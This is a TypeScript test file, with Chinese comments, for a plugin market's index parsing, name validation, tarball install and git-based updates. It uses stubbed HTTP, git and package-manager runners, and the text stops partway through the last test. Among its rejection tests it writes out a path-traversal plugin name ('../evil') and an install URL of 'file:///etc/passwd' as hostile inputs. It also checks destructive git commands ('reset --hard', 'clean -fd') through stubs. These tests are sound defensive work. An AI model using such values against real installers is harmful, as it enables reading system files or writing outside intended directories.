/**
 * 模块职责：插件市场的索引解析、名称校验、安装与卸载测试
 * 依赖方向：测试文件，依赖 plugin/market、plugin/tar、testing/fake
 * 生命周期：每个用例一套临时目录与一个市场实例，afterEach 删除目录
 * 注意事项：HTTP 由本文件内的替身提供，索引与归档都是现场构造的字节。安装路径不触及
 *          真实网络：声明 `tarball` 来源的条目走归档，声明 `git` 来源的条目由
 *          `MarketDeps.git` 的替身接管，**故一律不起真实的 git 子进程**。
 *          就地拉取那条路验的是**下发了哪些命令、以什么次序** —— 真实的 git 只能
 *          告诉你「最后目录对了」，而次序错掉（先 reset 后 stash）同样能得到一个
 *          对的目录，直到某天吃掉使用者的改动。故此处逐条比对参数数组。
 */
import { mkdir, readFile, mkdtemp, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { afterEach, describe, expect, it, vi } from "vitest"
import type { HttpClient } from "@yunzai-ng/types"
import { isDirectory, isFile } from "../util/fs.js"
import { fakeLogger, type FakeLogger } from "../testing/fake.js"
import { buildTarGz } from "./tar.js"
import type { PmRunner, PmTask } from "./pm.js"
import {
  PluginMarket,
  applyMirror,
  assertPluginName,
  compareVersion,
  parseIndex,
  tarballFromGit,
  type GitRunner,
  type MarketSettings
} from "./market.js"

/** 一个可编程的响应 */
interface StubReply {
  /** JSON 响应体 */
  json?: unknown
  /** 字节响应体 */
  bytes?: Uint8Array
  /** 令该地址失败 */
  error?: string
}

/** HTTP 替身与其调用记录 */
interface StubHttp {
  /** 客户端 */
  http: HttpClient
  /** 依次请求过的地址 */
  calls: string[]
}

/**
 * 造一个只认识给定地址的 HTTP 客户端
 * @param routes 地址到响应的映射
 * @returns 客户端与调用记录
 */
function stubHttp(routes: Record<string, StubReply>): StubHttp {
  const calls: string[] = []
  /** 取一条路由 */
  const pick = (url: string): StubReply => {
    calls.push(url)
    const reply = routes[url]
    if (reply === undefined) throw new Error(`替身未配置该地址：${url}`)
    if (reply.error !== undefined) throw new Error(reply.error)
    return reply
  }
  const client = {
    request: () => {
      throw new Error("用例不应调用 request")
    },
    get: async (url: string) => pick(url).json,
    post: () => {
      throw new Error("用例不应调用 post")
    },
    buffer: async (url: string) => pick(url).bytes ?? new Uint8Array(),
    download: () => {
      throw new Error("用例不应调用 download")
    },
    extend: () => client
  }
  return { http: client as unknown as HttpClient, calls }
}

/** 一次 git 调用的全部入参 */
interface GitCall {
  /** 命令参数 */
  args: readonly string[]
  /** 工作目录 */
  cwd: string
  /** 超时毫秒 */
  timeout: number
}

/** git 替身的可编程行为 */
interface StubGitOptions {
  /** `rev-parse HEAD` 依次返回的提交号，用尽后重复最后一个 */
  heads?: readonly string[]
  /** `status --porcelain` 的输出，非空即视为工作区有改动 */
  status?: string
  /** 令某个子命令失败 */
  fail?: { cmd: string; message: string }
  /** 某条命令执行后的副作用，用于模拟 reset 改写了工作区 */
  effect?: (args: readonly string[]) => Promise<void> | void
}

/** git 替身与其调用记录 */
interface StubGit {
  /** 注入 `MarketDeps.git` 的执行器 */
  run: GitRunner
  /** 依次收到的调用 */
  calls: GitCall[]
  /** 依次收到的子命令名，用于比对次序 */
  cmds: () => string[]
}

/**
 * 造一个不起子进程的 git
 *
 * 只认识就地拉取用到的那几条命令。遇到未编程的命令**抛错而非返回空串** ——
 * 静默返回会让「多下发了一条本不该有的命令」这类错误从用例里溜过去。
 * @param options 可编程行为
 * @returns 执行器与调用记录
 */
function stubGit(options: StubGitOptions = {}): StubGit {
  const calls: GitCall[] = []
  const heads = [...(options.heads ?? ["1111111aaa", "2222222bbb"])]
  const run: GitRunner = async (args, cwd, timeout) => {
    calls.push({ args: [...args], cwd, timeout })
    const cmd = args[0]
    if (options.fail !== undefined && options.fail.cmd === cmd) throw new Error(options.fail.message)
    await options.effect?.(args)
    if (cmd === "rev-parse") return `${heads.length > 1 ? heads.shift() : heads[0]}\n`
    if (cmd === "status") return options.status ?? ""
    if (cmd === "--version") return "git version 2.44.0\n"
    if (cmd === "stash" || cmd === "fetch" || cmd === "reset" || cmd === "clone" || cmd === "clean") return ""
    throw new Error(`替身未编程该命令：git ${args.join(" ")}`)
  }
  return { run, calls, cmds: () => calls.map(item => item.args[0] ?? "") }
}

/** 一次包管理器调用的全部入参 */
interface PmCall {
  /** 动作 */
  task: PmTask
  /** 工作目录 */
  cwd: string
}

/** 包管理器替身的可编程行为 */
interface StubPmOptions {
  /** 令某个动作失败：`install`，或某个 script 名 */
  fail?: { at: string; message: string }
  /** 某个动作执行后的副作用，用于模拟 `build` 产出了 `dist/` */
  effect?: (task: PmTask) => Promise<void> | void
}

/** 包管理器替身与其调用记录 */
interface StubPm {
  /** 注入 `MarketDeps.pm` 的执行器 */
  run: PmRunner
  /** 依次收到的调用 */
  calls: PmCall[]
}

/**
 * 造一个不起子进程的包管理器
 *
 * 记下**下发了什么**：装依赖带不带 devDependencies、跑的是哪几个 script、以什么次序。
 * 真实的 pnpm 只能告诉你「最后目录里有 node_modules」，而少跑一个 `build`、或用
 * `--prod` 装完再去跑 `build`，同样能得到一个看着对的目录 —— 直到插件加载时报出一条
 * 与原因无关的错。故此处逐条比对入参。
 * @param options 可编程行为
 * @returns 执行器与调用记录
 */
function stubPm(options: StubPmOptions = {}): StubPm {
  const calls: PmCall[] = []
  const run: PmRunner = async (task, cwd) => {
    calls.push({ task, cwd })
    const at = task.kind === "install" ? "install" : task.script
    if (options.fail?.at === at) throw new Error(options.fail.message)
    await options.effect?.(task)
    return "pnpm"
  }
  return { run, calls }
}

/** 一套市场及其周边 */
interface Harness {
  /** 市场 */
  market: PluginMarket
  /** 插件目录 */
  pluginsDir: string
  /** 索引缓存文件 */
  cacheFile: string
  /** 日志 */
  logger: FakeLogger
  /** HTTP 调用记录 */
  calls: string[]
  /** 根临时目录 */
  root: string
}

let harness: Harness | undefined

/**
 * 起一套市场
 * @param routes HTTP 替身路由
 * @param settings 配置覆盖
 * @param reuse 复用已有的临时目录（用于验证磁盘缓存跨实例生效）
 * @param git git 执行器替身，不给则连接一个「本机没有 git」的桩
 * @param pm 包管理器替身，不给则连接一个「不该被调用」的桩
 * @returns 市场与周边
 */
async function makeHarness(
  routes: Record<string, StubReply>,
  settings: Partial<MarketSettings> = {},
  reuse?: Harness,
  git?: GitRunner,
  pm?: PmRunner
): Promise<Harness> {
  const root = reuse?.root ?? (await mkdtemp(join(tmpdir(), "yzng-market-")))
  const pluginsDir = join(root, "plugins")
  const tempDir = join(root, "temp")
  const cacheFile = join(root, "cache", "market.json")
  await mkdir(pluginsDir, { recursive: true })
  const logger = reuse?.logger ?? fakeLogger()
  const { http, calls } = stubHttp(routes)
  const market = new PluginMarket({
    http,
    logger,
    pluginsDir,
    tempDir,
    cacheFile,
    coreVersion: "1.0.0",
    settings: () => ({
      sources: ["https://example.com/index.json"],
      mirror: "",
      cacheTtl: 60_000,
      timeout: 5000,
      ...settings
    }),
    /*
     * 不给替身的用例一律当作「本机没有 git」
     *
     * 缺省若落到真实的 git 上，同一份用例在装了 git 的机器上走克隆、在没装的机器上走
     * 归档 —— 两条完全不同的代码路径，而用例里看不出走的是哪条。抛错即令 `#hasGit()`
     * 记下 false，归档那条路由此成为确定的行为。
     */
    git: git ?? (() => Promise.reject(new Error("用例未注入 git 替身"))),
    /*
     * 不给替身的用例一律当作「不该跑包管理器」
     *
     * 缺省若落到真实的 pnpm 上，用例会在开发机上起子进程去联网装依赖 —— 慢、看网络脸色，
     * 且**装出来的东西落在临时目录里，afterEach 一删了之，于是断言什么也验不到**。抛错则
     * 令「本不该跑却跑了」当场失败，那正是要钉住的：缺省不跑依赖是一条行为约定。
     */
    pm: pm ?? (() => Promise.reject(new Error("用例未注入包管理器替身")))
  })
  harness = { market, pluginsDir, cacheFile, logger, calls, root }
  return harness
}

afterEach(async () => {
  if (harness !== undefined) await rm(harness.root, { recursive: true, force: true })
  harness = undefined
  vi.restoreAllMocks()
})

describe("assertPluginName", () => {
  it("接受常规名称", () => {
    expect(assertPluginName("mhy-game-plugin")).toBe("mhy-game-plugin")
    expect(assertPluginName("adapter.napcat")).toBe("adapter.napcat")
  })

  it("拒绝路径分隔符、上级目录与保留名", () => {
    for (const bad of ["../evil", "a/b", "a\\b", "..", ".hidden", "node_modules", "", "-leading"]) {
      expect(() => assertPluginName(bad), bad).toThrow()
    }
  })
})

describe("compareVersion", () => {
  it("按数值段比较，位数不同也能比", () => {
    expect(compareVersion("1.2.0", "1.10.0")).toBeLessThan(0)
    expect(compareVersion("2.0", "1.9.9")).toBeGreaterThan(0)
    expect(compareVersion("1.0.0", "1.0.0")).toBe(0)
  })

  it("忽略预发布标识", () => {
    expect(compareVersion("1.0.0-beta.1", "1.0.0")).toBe(0)
  })
})

describe("applyMirror", () => {
  it("只对白名单主机套前缀", () => {
    expect(applyMirror("https://github.com/a/b", "https://gh-proxy.org/")).toBe("https://gh-proxy.org/https://github.com/a/b")
    expect(applyMirror("https://example.com/i.json", "https://gh-proxy.org/")).toBe("https://example.com/i.json")
  })

  it("前缀为空或地址不可解析时原样返回", () => {
    expect(applyMirror("https://github.com/a/b", "  ")).toBe("https://github.com/a/b")
    expect(applyMirror("不是地址", "https://gh-proxy.org")).toBe("不是地址")
  })
})

describe("tarballFromGit", () => {
  it("由 GitHub 仓库地址推出 codeload 归档地址", () => {
    expect(tarballFromGit("https://github.com/a/b.git", "main")).toBe("https://codeload.github.com/a/b/tar.gz/main")
    expect(tarballFromGit("https://github.com/a/b")).toBe("https://codeload.github.com/a/b/tar.gz/HEAD")
  })

  it("非 GitHub 地址无法推导", () => {
    expect(tarballFromGit("https://gitee.com/a/b.git")).toBeUndefined()
  })
})

describe("parseIndex", () => {
  it("接受 { plugins: [...] } 与顶层数组两种形状", () => {
    const one = { name: "a", install: { type: "git", url: "https://github.com/a/a" } }
    expect(parseIndex({ plugins: [one] }, "s")).toHaveLength(1)
    expect(parseIndex([one], "s")).toHaveLength(1)
  })

  it("补齐可选字段，标题缺省取插件名", () => {
    const [entry] = parseIndex(
      [{ name: "demo", install: { type: "tarball", url: "https://example.com/d.tar.gz" } }],
      "s"
    )
    expect(entry).toMatchObject({ name: "demo", title: "demo", description: "", tags: [], official: false, source: "s" })
    expect(entry?.author).toBeUndefined()
  })

  it("整条丢弃不合法的记录，而不是补默认值", () => {
    const entries = parseIndex(
      [
        { install: { type: "git", url: "https://github.com/a/a" } },
        { name: "../evil", install: { type: "git", url: "https://github.com/a/a" } },
        { name: "nourl", install: { type: "git" } },
        { name: "badtype", install: { type: "svn", url: "https://example.com/x" } },
        { name: "badproto", install: { type: "tarball", url: "file:///etc/passwd" } },
        42,
        { name: "good", install: { type: "git", url: "https://github.com/a/a" } }
      ],
      "s"
    )
    expect(entries.map(item => item.name)).toEqual(["good"])
  })

  it("tags 中的非字符串项被剔除", () => {
    const [entry] = parseIndex(
      [{ name: "a", tags: ["工具", 1, null], install: { type: "git", url: "https://github.com/a/a" } }],
      "s"
    )
    expect(entry?.tags).toEqual(["工具"])
  })

  it("文档形状完全不符时抛错", () => {
    expect(() => parseIndex({ items: [] }, "s")).toThrow("索引格式不符")
  })
})

/** 一份最小索引 */
const INDEX = {
  version: 1,
  plugins: [
    {
      name: "demo",
      title: "示例插件",
      description: "用于测试",
      version: "1.0.0",
      tags: ["示例"],
      official: true,
      install: { type: "tarball", url: "https://example.com/demo.tar.gz" }
    }
  ]
}

describe("PluginMarket 索引", () => {
  it("列出条目并标注安装状态", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })

    const first = await h.market.list()
    expect(first.plugins.map(item => item.name)).toEqual(["demo"])
    expect(first.plugins[0]).toMatchObject({ title: "示例插件", official: true, installed: false })
    expect(first.sources).toEqual([{ url: "https://example.com/index.json", ok: true, count: 1 }])

    await mkdir(join(h.pluginsDir, "demo"), { recursive: true })
    expect((await h.market.list()).plugins[0]?.installed).toBe(true)
  })

  /*
   * 「可更新」的三种判法各验一遍
   *
   * 面板的市场页据此出一个「可更新」页签。三条里最要紧的是「读不到版本时不算可更新」——
   * 那时无从比较，而标成可更新会让人点一次更新去换一个同样的东西。
   */
  it("已装版本低于索引时标为可更新", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    await mkdir(join(h.pluginsDir, "demo"), { recursive: true })
    await writeFile(join(h.pluginsDir, "demo", "package.json"), JSON.stringify({ version: "0.9.0" }), "utf8")

    expect((await h.market.list()).plugins[0]).toMatchObject({
      installed: true,
      installedVersion: "0.9.0",
      updatable: true
    })
  })

  it("已装版本不低于索引时不算可更新", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    await mkdir(join(h.pluginsDir, "demo"), { recursive: true })
    await writeFile(join(h.pluginsDir, "demo", "package.json"), JSON.stringify({ version: "1.0.0" }), "utf8")

    expect((await h.market.list()).plugins[0]).toMatchObject({ installedVersion: "1.0.0", updatable: false })
  })

  it("已装但读不到版本时不给 installedVersion，也不算可更新", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    // 目录在、没有 package.json：手工放进来的插件常是这样
    await mkdir(join(h.pluginsDir, "demo"), { recursive: true })

    const item = (await h.market.list()).plugins[0]
    expect(item?.installed).toBe(true)
    expect(item?.installedVersion).toBeUndefined()
    expect(item?.updatable).toBe(false)
  })

  it("未装时不去读版本，updatable 为假", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    const item = (await h.market.list()).plugins[0]
    expect(item?.installedVersion).toBeUndefined()
    expect(item?.updatable).toBe(false)
  })

  it("缓存未过期时不再发请求，force 才重新获取", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })

    await h.market.list()
    await h.market.list()
    expect(h.calls).toHaveLength(1)

    const forced = await h.market.list(true)
    expect(h.calls).toHaveLength(2)
    expect(forced.cached).toBe(false)
  })

  it("多个索引按顺序合并，同名条目以靠前的源为准", async () => {
    const h = await makeHarness(
      {
        "https://a.example.com/i.json": {
          json: [{ name: "demo", title: "私有源", install: { type: "git", url: "https://github.com/a/a" } }]
        },
        "https://b.example.com/i.json": {
          json: [
            { name: "demo", title: "官方源", install: { type: "git", url: "https://github.com/b/b" } },
            { name: "other", install: { type: "git", url: "https://github.com/b/c" } }
          ]
        }
      },
      { sources: ["https://a.example.com/i.json", "https://b.example.com/i.json"] }
    )

    const snapshot = await h.market.list()
    expect(snapshot.plugins.map(item => item.name)).toEqual(["demo", "other"])
    expect(snapshot.plugins.find(item => item.name === "demo")?.title).toBe("私有源")
  })

  it("单个索引失败时记录原因，其余索引照常贡献条目", async () => {
    const h = await makeHarness(
      {
        "https://bad.example.com/i.json": { error: "连接被拒绝" },
        "https://ok.example.com/i.json": { json: INDEX }
      },
      { sources: ["https://bad.example.com/i.json", "https://ok.example.com/i.json"] }
    )

    const snapshot = await h.market.list()
    expect(snapshot.plugins).toHaveLength(1)
    expect(snapshot.sources[0]).toMatchObject({ ok: false, error: "连接被拒绝", count: 0 })
    expect(h.logger.lines.some(line => line.includes("索引获取失败"))).toBe(true)
  })

  it("全部索引不可达时沿用磁盘缓存", async () => {
    const first = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    await first.market.list()
    expect(await isFile(first.cacheFile)).toBe(true)

    // 新实例共用同一份缓存文件：模拟重启后断网打开面板
    const second = await makeHarness({ "https://example.com/index.json": { error: "网络不可达" } }, { cacheTtl: 0 }, first)
    const snapshot = await second.market.list()

    expect(snapshot.plugins.map(item => item.name)).toEqual(["demo"])
    expect(snapshot.sources[0]?.ok).toBe(false)
    expect(second.logger.lines.some(line => line.includes("沿用上次缓存"))).toBe(true)
  })
})

/** 归档地址 */
const TARBALL = "https://example.com/demo.tar.gz"

/**
 * 造一份带外层目录的插件归档
 * @param manifest package.json 内容，undefined 表示不含该文件
 * @param marker 写入 index.js 的标记内容
 * @returns gzip 压缩的归档
 */
function pluginArchive(manifest: Record<string, unknown> | undefined, marker = "v1"): Uint8Array {
  const files: { path: string; content: string }[] = [{ path: "demo-main/index.js", content: `export default "${marker}"` }]
  if (manifest !== undefined) files.unshift({ path: "demo-main/package.json", content: JSON.stringify(manifest) })
  return buildTarGz(files)
}

describe("PluginMarket 安装", () => {
  it("解包到插件目录，版本取自 package.json，并提示需要安装依赖", async () => {
    const h = await makeHarness({
      "https://example.com/index.json": { json: INDEX },
      [TARBALL]: { bytes: pluginArchive({ name: "demo", version: "1.2.3", dependencies: { lodash: "^4" } }) }
    })

    const result = await h.market.install("demo")

    expect(result).toMatchObject({ name: "demo", via: "tarball", version: "1.2.3", needsDependencies: true })
    /*
     * 归档装出来的目录没有 `.git`，故此后的更新是整目录重下
     *
     * 这一条钉的是「装完就说清此后更新的代价」：归档那条路每次更新都要重装依赖，
     * 而 git 那条路保住 `node_modules`。说反了会让使用者对着一个几十兆的重装等半天。
     */
    expect(result.updatable).toBe("reinstall")
    expect(result.dir).toBe(join(h.pluginsDir, "demo"))
    expect(await readFile(join(h.pluginsDir, "demo", "index.js"), "utf8")).toBe('export default "v1"')
    expect(await isFile(join(h.pluginsDir, "demo", "package.json"))).toBe(true)
    expect(h.logger.lines.some(line => line.includes("声明了运行时依赖"))).toBe(true)
    // 外层的 demo-main/ 必须被剥掉，否则入口文件深一层，宿主扫不到
    expect(await isDirectory(join(h.pluginsDir, "demo", "demo-main"))).toBe(false)
  })

  it("没有 package.json 时版本退回索引声明，且不提示依赖", async () => {
    const h = await makeHarness({
      "https://example.com/index.json": { json: INDEX },
      [TARBALL]: { bytes: pluginArchive(undefined) }
    })

    const result = await h.market.install("demo")
    expect(result).toMatchObject({ version: "1.0.0", needsDependencies: false })
  })

  it("目标已存在时拒绝安装，update 才覆盖", async () => {
    const h = await makeHarness({
      "https://example.com/index.json": { json: INDEX },
      [TARBALL]: { bytes: pluginArchive({ version: "2.0.0" }, "v2") }
    })
    await mkdir(join(h.pluginsDir, "demo"), { recursive: true })
    await writeFile(join(h.pluginsDir, "demo", "旧文件.txt"), "旧内容", "utf8")

    await expect(h.market.install("demo")).rejects.toThrow("已安装")

    const result = await h.market.update("demo")
    expect(result.version).toBe("2.0.0")
    expect(await readFile(join(h.pluginsDir, "demo", "index.js"), "utf8")).toBe('export default "v2"')
    // 覆盖是整体替换：旧版本残留的文件不应当留在新版本目录里
    expect(await isFile(join(h.pluginsDir, "demo", "旧文件.txt"))).toBe(false)
  })

  it("非 GitHub 的纯 git 来源在本机没有 git 时明确报错，而不是静默失败", async () => {
    /*
     * GitHub 的 git 地址可换算出 codeload 归档，故缺 git 仍装得上；而其余托管站
     * 换算不出来 —— 那时确实无路可走，须当场说清，且话里要点出「未安装 git」这个
     * 真实原因。静默失败会让用户以为是网络问题，转而反复重试。
     */
    const h = await makeHarness({
      "https://example.com/index.json": {
        json: { plugins: [{ name: "gitonly", install: { type: "git", url: "https://gitee.com/a/gitonly" } }] }
      }
    })

    await expect(h.market.install("gitonly")).rejects.toThrow(/仅提供 git 来源.*未安装 git/)
  })

  it("内核版本不满足 minCore 时拒绝安装", async () => {
    const h = await makeHarness({
      "https://example.com/index.json": {
        json: { plugins: [{ ...INDEX.plugins[0], minCore: "9.0.0" }] }
      },
      [TARBALL]: { bytes: pluginArchive({ version: "1.0.0" }) }
    })

    await expect(h.market.install("demo")).rejects.toThrow("要求内核版本不低于 9.0.0")
    expect(await isDirectory(join(h.pluginsDir, "demo"))).toBe(false)
  })

  it("索引中没有的插件与不合法的名称都拒绝", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })

    await expect(h.market.install("ghost")).rejects.toThrow("没有名为 ghost")
    await expect(h.market.install("../evil")).rejects.toThrow("不合法")
  })

  it("取到的内容不像插件时拒绝，插件目录保持原状", async () => {
    const h = await makeHarness({
      "https://example.com/index.json": { json: INDEX },
      [TARBALL]: { bytes: buildTarGz([{ path: "demo-main/README.md", content: "# 文档" }]) }
    })

    await expect(h.market.install("demo")).rejects.toThrow("不像插件")
    expect(await isDirectory(join(h.pluginsDir, "demo"))).toBe(false)
  })

  it("下载失败时不留下半个插件目录", async () => {
    const h = await makeHarness({
      "https://example.com/index.json": { json: INDEX },
      [TARBALL]: { error: "连接超时" }
    })

    await expect(h.market.install("demo")).rejects.toThrow("连接超时")
    expect(await isDirectory(join(h.pluginsDir, "demo"))).toBe(false)
  })
})

/** 一份声明 git 来源的索引 */
const GIT_INDEX = {
  version: 1,
  plugins: [
    {
      name: "demo",
      title: "示例插件",
      version: "1.0.0",
      install: { type: "git", url: "https://github.com/demo/demo.git" }
    }
  ]
}

/** git 归档退路的地址，由上面那个仓库地址换算而来 */
const CODELOAD = "https://codeload.github.com/demo/demo/tar.gz/HEAD"

/**
 * 造一个「由 git 装来的」插件目录
 *
 * 关键在于 `.git` 与 `node_modules` 两处：前者是就地拉取的判据，后者是这一批要保住的
 * 东西 —— 它由使用者自己 `pnpm install` 装出，重装一次插件就要在国内网络下重来一遍。
 * @param pluginsDir 插件根目录
 * @param version 现装版本
 * @returns 插件目录路径
 */
async function makeGitRepo(pluginsDir: string, version = "1.0.0"): Promise<string> {
  const dir = join(pluginsDir, "demo")
  await mkdir(join(dir, ".git"), { recursive: true })
  await mkdir(join(dir, "node_modules", "lodash"), { recursive: true })
  await writeFile(join(dir, "package.json"), JSON.stringify({ name: "demo", version }), "utf8")
  await writeFile(join(dir, "index.js"), 'export default "v1"', "utf8")
  return dir
}

describe("PluginMarket 就地拉取", () => {
  it("目录是 git 仓库时就地拉取，命令次序为 fetch 而后 reset，且不动 node_modules", async () => {
    const git = stubGit({
      effect: async args => {
        // reset 之后工作区已是新版本：模拟远端把版本号提到了 1.1.0
        if (args[0] === "reset") {
          await writeFile(join(harness!.pluginsDir, "demo", "package.json"), JSON.stringify({ version: "1.1.0" }), "utf8")
        }
      }
    })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    const dir = await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo")

    expect(result).toMatchObject({
      name: "demo",
      dir,
      via: "pull",
      version: "1.1.0",
      fromVersion: "1.0.0",
      changed: true
    })
    // 整条序列逐字钉住：多一条、少一条、次序错一处都算失败
    expect(git.cmds()).toEqual(["--version", "rev-parse", "status", "fetch", "reset", "rev-parse"])
    // 那份依赖是这一批的全部意义所在
    expect(await isDirectory(join(dir, "node_modules", "lodash"))).toBe(true)
    expect(h.logger.lines.some(line => line.includes("已就地更新至 1.1.0"))).toBe(true)
  })

  it("拉取用 fetch --depth 1 加 reset --hard FETCH_HEAD，绝不用 pull", async () => {
    const git = stubGit()
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    await h.market.update("demo")

    expect(git.cmds()).not.toContain("pull")
    const fetch = git.calls.find(item => item.args[0] === "fetch")
    expect(fetch?.args).toEqual(["fetch", "--depth", "1", "https://github.com/demo/demo.git", "HEAD"])
    expect(git.calls.find(item => item.args[0] === "reset")?.args).toEqual(["reset", "--hard", "FETCH_HEAD"])
    // 含网络往返的那一条才给长超时，只读本地的几条不该跟着放宽
    expect(fetch?.timeout).toBe(5 * 60 * 1000)
    expect(git.calls.find(item => item.args[0] === "reset")?.timeout).toBe(10_000)
  })

  it("fetch 的地址每次由镜像前缀现算，不沿用目录里的 origin", async () => {
    const git = stubGit()
    const h = await makeHarness(
      { "https://example.com/index.json": { json: GIT_INDEX } },
      { mirror: "https://gh-proxy.org/" },
      undefined,
      git.run
    )
    await makeGitRepo(h.pluginsDir)

    await h.market.update("demo")

    expect(git.calls.find(item => item.args[0] === "fetch")?.args[3]).toBe(
      "https://gh-proxy.org/https://github.com/demo/demo.git"
    )
  })

  it("索引声明分支时按该分支拉取", async () => {
    const git = stubGit()
    const h = await makeHarness(
      {
        "https://example.com/index.json": {
          json: { plugins: [{ ...GIT_INDEX.plugins[0], install: { type: "git", url: "https://github.com/demo/demo.git", branch: "dev" } }] }
        }
      },
      {},
      undefined,
      git.run
    )
    await makeGitRepo(h.pluginsDir)

    await h.market.update("demo")

    expect(git.calls.find(item => item.args[0] === "fetch")?.args[4]).toBe("dev")
  })

  it("提交号没变时 changed 为假，日志说已是最新而非已更新", async () => {
    const git = stubGit({ heads: ["1111111aaa"] })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo")

    expect(result).toMatchObject({ via: "pull", changed: false, version: "1.0.0" })
    expect(h.logger.lines.some(line => line.includes("已是最新版本"))).toBe(true)
    expect(h.logger.lines.some(line => line.includes("已就地更新"))).toBe(false)
  })

  /*
   * 有改动而未获同意时**原地中止**
   *
   * 从前这里无条件暂存，理由是「留了副本，可取回」—— 但取回要懂 `git stash pop`，
   * 不懂的人只看到自己改的东西不见了。这一条钉住两件事：抛错，且**目录未被动过**
   * （`reset` 一次都没跑）。后者是「重来一次没有代价」的凭据。
   */
  it("有改动而未同意暂存时中止，目录一个字节都没动", async () => {
    const git = stubGit({ status: " M index.js\n?? 我的笔记.txt\n" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    await expect(h.market.update("demo")).rejects.toThrow("未提交的改动")

    const cmds = git.cmds()
    expect(cmds).not.toContain("stash")
    expect(cmds).not.toContain("reset")
    expect(cmds).not.toContain("fetch")
  })

  it("同意暂存时先 stash 再 reset，且给出取回办法", async () => {
    const git = stubGit({ status: " M index.js\n?? 我的笔记.txt\n" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo", { stash: true })

    const cmds = git.cmds()
    // 次序即安全性：reset --hard 会覆盖工作区，暂存必须发生在它之前
    expect(cmds.indexOf("stash")).toBeLessThan(cmds.indexOf("reset"))
    expect(cmds.indexOf("stash")).toBeLessThan(cmds.indexOf("fetch"))
    const stash = git.calls.find(item => item.args[0] === "stash")
    // 未跟踪的文件更可能是使用者自己放进去的，一并收走
    expect(stash?.args.slice(0, 3)).toEqual(["stash", "push", "--include-untracked"])
    expect(h.logger.lines.some(line => line.includes("git stash pop"))).toBe(true)
    // 面板据此说「你的改动在 stash 里」—— 日志里那句话多数人不会去看
    expect(result.stashed).toBe(true)
    expect(result.discarded).toBeUndefined()
  })

  /*
   * 丢弃那一路要 `clean -fd` 补一刀
   *
   * `reset --hard` 不动未跟踪的文件，少了 clean，「丢弃改动」这个承诺只对已跟踪的文件
   * 成立，而使用者自己新放进去的文件正是他选这一项时想清掉的东西。
   */
  it("选择丢弃时 reset 之外还 clean，且不 stash", async () => {
    const git = stubGit({ status: " M index.js\n?? 我的笔记.txt\n" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo", { onDirty: "discard" })

    const cmds = git.cmds()
    expect(cmds).not.toContain("stash")
    expect(cmds).toContain("clean")
    const clean = git.calls.find(item => item.args[0] === "clean")
    expect(clean?.args).toEqual(["clean", "-fd"])
    expect(result.discarded).toBe(true)
    // 与 stash 分开报：合成一个字段会让面板对刚丢掉改动的人说「可以 pop 取回」
    expect(result.stashed).toBeUndefined()
  })

  /*
   * 丢弃是不可撤销的，日志里必须说明这一点
   *
   * stash 那一路的日志给的是取回办法，而这一路照抄一句「已处理」会让人事后去找一个
   * 不存在的 stash 条目。
   */
  it("丢弃时日志说明改动无法取回", async () => {
    const git = stubGit({ status: " M index.js\n" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    await h.market.update("demo", { onDirty: "discard" })

    expect(h.logger.lines.some(line => line.includes("无法取回"))).toBe(true)
    expect(h.logger.lines.some(line => line.includes("git stash pop"))).toBe(false)
  })

  /*
   * 工作区干净时 `discard` 不该多跑那两条命令
   *
   * 它们在干净的目录上是空操作，但每一条都可能失败（仓库状态异常、权限），
   * 而那会把一次本该成功的更新变成一条错误。
   */
  it("工作区干净时选择丢弃也不 clean", async () => {
    const git = stubGit({ status: "" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo", { onDirty: "discard" })

    expect(git.cmds()).not.toContain("clean")
    expect(result.discarded).toBeUndefined()
  })

  /*
   * 探测：面板据此决定要不要问
   *
   * 与执行**同一个判据**（`#isDirty`）。分两处写迟早分叉，而症状恰是这次要消除的
   * 那一个：面板问都没问就暂存了。
   */
  it("探测给出「会不会就地拉取」与「有没有改动」", async () => {
    const dirtyGit = stubGit({ status: " M index.js\n" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, dirtyGit.run)
    await makeGitRepo(h.pluginsDir)

    expect(await h.market.inspectUpdate("demo")).toEqual({ willPull: true, dirty: true })
  })

  it("探测：工作区干净时 dirty 为假", async () => {
    const git = stubGit({ status: "" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    expect(await h.market.inspectUpdate("demo")).toEqual({ willPull: true, dirty: false })
  })

  /*
   * 不是 git 仓库时 `dirty` 恒为假
   *
   * 那条路是整目录重装，根本不碰 git —— 报「有改动」却给不出「可以暂存」只会让人困惑。
   */
  it("探测：目录不是 git 仓库时 willPull 与 dirty 都为假", async () => {
    const git = stubGit({ status: " M index.js\n" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
